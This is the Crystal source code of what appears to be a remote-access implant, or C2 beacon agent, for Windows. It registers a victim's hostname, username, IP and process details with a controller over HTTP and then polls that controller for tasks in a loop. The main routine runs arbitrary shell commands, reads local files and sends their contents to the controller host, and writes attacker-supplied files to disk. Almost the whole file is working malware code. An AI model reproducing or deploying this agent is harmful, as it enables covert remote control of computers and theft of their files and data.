require "instance"
require "http/client"
require "json"

lib LibC
    struct IP_ADAPTER_INFO
        next2 : Pointer(IP_ADAPTER_INFO)
        comboIndex : DWORD
        adapterName : Char[TMP_SIZE2]
        description : Char[TMP_SIZE1]
        addressLength : UInt
        address : BYTE[MAX_ADAPTER_ADDRESS_LENGTH]
        index : DWORD
        type : UInt
        dhcpEnabled : UInt
        currentIpAddress : Pointer(IP_ADDR_STRING)
        ipAddressList : IP_ADDR_STRING
        gatewayList : IP_ADDR_STRING
        dhcpServer : IP_ADDR_STRING
        haveWins : Bool
        primaryWinsServer : IP_ADDR_STRING
        secondaryWinsServer : IP_ADDR_STRING
        leaseObtained : TimeT
        leaseExpires : TimeT
    end

    struct IP_ADDR_STRING
        next2 : Pointer(IP_ADDR_STRING)
        ipAddress : IP_ADDRESS_STRING
        ipMask : IP_ADDRESS_STRING
        context : DWORD
    end

    struct IP_ADDRESS_STRING
        string : Char[16]
    end

    fun GetUserNameA(lpBuffer : Pointer(UInt8), pcbBuffer : Pointer(DWORD)) : BOOL
    fun GetAdaptersInfo(adapterInfo : Pointer(IP_ADAPTER_INFO), sizePointer : Pointer(ULong)) : ULong

    MAX_ADAPTER_DESCRIPTION_LENGTH = 128
    MAX_ADAPTER_NAME_LENGTH = 256
    MAX_ADAPTER_ADDRESS_LENGTH = 8
    TMP_SIZE1 = MAX_ADAPTER_DESCRIPTION_LENGTH + 4
    TMP_SIZE2 = MAX_ADAPTER_NAME_LENGTH + 4
end

def main(instance : Instance)
    raw = uninitialized UInt8[4]
    outputdata = ""

    while true
        if !instance.session.connected
            data = init(instance)
            json = {"task" => "register", "data" => data}

            sendResponse(instance, json.to_json, raw)
            
            instance.session.connected = true
        else
            json = {"task" => "gettask", "data" => ""}

            response = sendResponse(instance, json.to_json, raw)
            commands = response.body

            outputdata = ""
            if commands.size > 4
                commandId = IO::ByteFormat::LittleEndian.decode(UInt32, commands[0,4].to_slice)

                case commandId
                when Session::CommandId::COMMAND_SHELL.value
                    shellCommand = commands.split(commands[0,8])[1]
                    shellCommand = shellCommand.split(shellCommand[-1])[0]

                    stdout = IO::Memory.new
                    result = Process.run(shellCommand, shell: true, output: stdout)
                    outputdata = outputdata + stdout.to_s

                    json = {"task" => "cmdoutput", "data" => outputdata}
                when  Session::CommandId::COMMAND_DOWNLOAD.value
                    filename = commands.split(commands[0,8])[1].delete('\0').delete(' ')

                    content = File.read(filename)

                    outputdata = {"FileName" => filename, "FileSize" => content.size, "FileContent" => content}

                    json = {"task" => "download", "data" => outputdata}
                when Session::CommandId::COMMAND_UPLOAD.value
                    filename = commands.split("\0\u000E\0\0\0")[0].split(commands[0,8])[1]
                    fileContent = commands.split("\0\u000E\0\0\0")[1]

                    File.write(filename, fileContent)
                    
                    json = {"task" => "upload", "data" => "Successfully uploaded the file"}
                end

                sendResponse(instance, json.to_json, raw)
            end
        end

        sleepBeacon(instance)
    end
end

def init(instance : Instance)
    hostname = System.hostname

    username_ptr = Pointer(UInt8).malloc(250)
    username_size = LibC::DWORD.new(250)
    result = LibC.GetUserNameA(username_ptr, pointerof(username_size))
    username = String.new(username_ptr)

    # TODO: Get domain
    domain = ""

    length = UInt32.new(0)
    result = LibC.GetAdaptersInfo(nil.as(Pointer(LibC::IP_ADAPTER_INFO)), pointerof(length))

    adapter = Pointer(LibC::IP_ADAPTER_INFO).malloc(length)
    result = LibC.GetAdaptersInfo(adapter, pointerof(length))

    ip = String.new(adapter.value.ipAddressList.ipAddress.string.to_unsafe)

    processPath = Process.executable_path
    cwd = ""

    if processPath.is_a?(String)
        cwd = File.dirname(processPath)
    end

    pid = Process.pid().to_s
    ppid = "0"
    arch = "x64"
    elevated = "0"
    osBuild = ""
    osArch = "x64"
    sleepTimer = instance.config.sleeping
    processName = ""

    if processPath.is_a?(String)
        processName = File.basename(processPath)
    end
    
    osVersion = "Windows 10"

    return {"AgentID" => instance.session.agentID.to_s, "Hostname" => hostname, "Username" => username, "Domain" => domain, "InternalIP" => ip, "Process Path" => processPath, "Process ID" => pid, "Process Parent ID" => ppid, "Process Arch" => arch, "Process Elevated" => elevated, "OS Build" => osBuild, "OS Arch" => arch, "Sleep" => sleepTimer, "Process Name" => processName, "OS Version" => osVersion}
end

def sendResponse(instance : Instance, json : String, raw : Int[4])
    IO::ByteFormat::LittleEndian.encode((instance.config.magicId + instance.session.agentIDString + json).size + 4, raw.to_slice)
    packageSize = String.new(raw.to_slice)

    HTTP::Client.post("http://" + instance.config.transport.host, body: packageSize + instance.config.magicId + instance.session.agentIDString + json) 
end

def sleepBeacon(instance : Instance)
    sleep instance.config.sleeping
end

instance = Instance.new()

main(instance)